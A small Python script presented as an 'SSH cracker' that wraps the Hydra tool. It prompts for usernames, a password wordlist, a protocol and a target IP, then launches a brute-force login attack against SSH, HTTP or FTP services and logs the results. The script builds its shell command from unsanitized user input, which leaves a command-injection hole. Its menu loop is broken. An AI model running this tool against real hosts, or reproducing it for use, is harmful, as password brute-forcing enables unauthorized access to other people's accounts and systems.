#!/usr/bin/env python3
#SSH cracker

import os
import sys




print("Protocol Cracker - powered by Hydra")

print("""
OPTIONS 
a)BruteForce/Dict Attack - Powered By Hydra 
b)?? maybe a blank cmd to log in
c)Help
d)Back
e)Exit/Quit

              """)
              
statement = input("").lower()

while True:
        #os.system('clear')
              #ans=raw_input
       #ans=raw_input("What would you like to do? ")
	if statement=="a":
		print("\nProtocol Cracker:")

		while True:
			#os.system('cd Modules/attack/systemaccess/protocolcracker/')
			print('Enter Username/Username File Path')
			print( '---------------------------------')
			var = input("")
			if '.' in var:
				user = '-L' 
			else:
				user = '-l'
			print('Enter Password file/list, wordlists shown below')
			print('\n')
			os.system('ls *.txt')
			print( '---------------------------------')
			var2 = input("").lower()
			if '.' in var2:
				passfile = '-P' 
			else:
				passfile = '-p'
			print('Enter Protocol - ssh, http, ftp...')
			print( '---------------------------------')
			var3 = input("")
			print('Enter Target IP')
			print( '---------------------------------')
			var4 = input("")
			os.system('hydra '+ user + var + ' '+ passfile  + var2 + ' ' + var3 + '://' + var4 + ' | tee -a protocollog.txt')
			#note: make this save to a log file as well
			print( '-------------------------------------------------------------------------------')
			print('If succesful, a username and password will appear above!')

			print('\n')

# I know this is complicated, explanation: hydra -l/-L USERNAME/USERNAME.txt -p/-P PASS/PASS.txt PROTOCOL://IP ADDRESS
#					ex: hydra -L ballstothewall.txt -P rockyou.txt ssh://127.0.0.1
#					Capital letters mean file, lowecase mean string:
#					ex: hydra -l johndoe -p p@ssw0rd ssh://127.0.0.1
			

	else:
		print('Invalid Option, please try again')